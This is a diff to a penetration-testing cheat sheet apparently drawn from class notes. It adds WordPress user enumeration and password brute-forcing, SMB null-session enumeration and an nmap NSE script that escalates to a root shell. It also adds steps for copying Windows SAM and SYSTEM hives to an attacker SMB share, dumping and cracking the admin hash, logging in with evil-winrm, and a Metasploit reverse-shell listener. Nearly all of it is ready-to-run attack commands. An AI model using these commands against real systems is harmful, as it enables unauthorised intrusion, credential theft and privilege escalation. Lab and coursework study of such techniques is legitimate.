@@ -3,6 +3,9 @@ PTD Unit Cheat Sheet based on class notes
 
 ### Python One Liner
 ``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```
+### Searchsploit
+```searchsploit -m path/./exploit.py```
+
 
 ## Recon
 
@@ -39,7 +42,31 @@ In this example product control is a cron job, and is given permissions to run.
 Lists the processes that are being launched in real time, including processes owned by root.
 ```
 
+### Wordy websites
+Scan for login details
+``` wpscan --url http://wordy/ --enumerate p --enumerate t --enumerate u```
+Save all account details in file and run
+```wpscan --url //wordy/ -U users -P password```
 
+### SMBClient
+```
+smbclient \\\\IP\\ -L -N
+# If somehow the above command does not work (showing access denied)
+smbclient \\\\IP\\ -L -N -I IP
+# use the similar command option to login to the share
+smbclient \\\\IP\\SHARE -N -I IP
+# Login using null session
+smbclient \\\\192.168.x.x\\SHARE_NAME -N
+
+If you can enumerate share try cd ../
+```
+### smbmap
+```
+# domain is optional, may put -u '' -p '' to confirm null session access
+smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
+# depth probably > 5 if you wanna traverse and search deep into a share
+smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
+```
 
 
 ## Escalate Privileges
@@ -116,8 +143,44 @@ Check permissions for vulnerable service executable path
 #```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
 Replace executable.exe with a reverse shell payload and restarting the service
 
-
+### Run NMAP as root permissions
+``` echo "os.execute('/bin/sh')">/tmp/root.nse```
+```sudo nmap --script=/tmp/root.nse```
  
+### Export SAM and SYSTEM file to kali machine
+```
+impacket-smbserver share -smb2support -username USER -password PASS
+
+#On windows use net use X: \\10.8.0.3\share /user:USER PASS
+copy Backup\* X:\
+
+Files should be on kali
+dump stored hash from registry files
+
+impacket-secretdump -sam SAM -system SYSTEM LOCAL
+
+Put admin nthash in a file
+
+Use hashcat to crack the hash
+hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
+
+Use xfreedp or evil-winrm to gain access
+
+evil-winrm -i 192.168.x.x -u Adminstrator -p PASS
+```
+Using Metasploit for above
+After uploading into shares use msfconsole
+```
+use exploit/multi/handler
+set payload generic/shell_reverse_tcp
+set LHOST IP
+set LPORT 4446
+run
+```
+
+
+
+
 
 
 
